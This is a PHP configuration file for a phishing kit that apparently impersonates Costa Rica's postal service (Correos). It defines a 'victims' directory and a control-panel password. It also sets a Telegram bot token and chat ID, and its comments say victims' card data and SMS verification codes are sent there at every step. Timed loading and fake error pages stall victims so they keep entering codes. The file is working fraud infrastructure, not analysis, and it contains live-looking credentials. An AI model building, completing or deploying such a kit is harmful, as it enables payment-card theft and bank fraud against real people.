<?php
declare(strict_types=1);

date_default_timezone_set('America/Costa_Rica');

define('KIT_NAME', 'correos_cr');
define('DATA_DIR', __DIR__ . '/../data');
define('VICTIMS_DIR', DATA_DIR . '/victims');
define('PANEL_PASS', 'hhhhhhh');
define('SESSION_NAME', 'correos_sess');

// Telegram alerts — victim data is sent here on every step (card + SMS)
// To create a bot: talk to @BotFather on Telegram -> /newbot -> copy the token
// To get your chat ID: send a message to @userinfobot -> copy "Id"
define('TG_BOT_TOKEN', '8524933284:AAHXn2qM3XHXqH5C18U9PENrSH7GcPnCIa0');
define('TG_CHAT_ID', '-5313650734');

// SMS verification: set an expected code here and a victim who enters it
// skips the SMS-error page and goes straight to finish. Leave '' to always
// show the SMS-error page before finish (default stall behavior).
define('SMS_VERIFY_CODE', '');

// Flow timing (seconds)
define('T_LOADING1', 15);  // card page -> loading -> sms page
define('T_LOADING2', 8);   // sms page -> loading -> error page
define('T_ERROR', 8);      // error page -> finish page
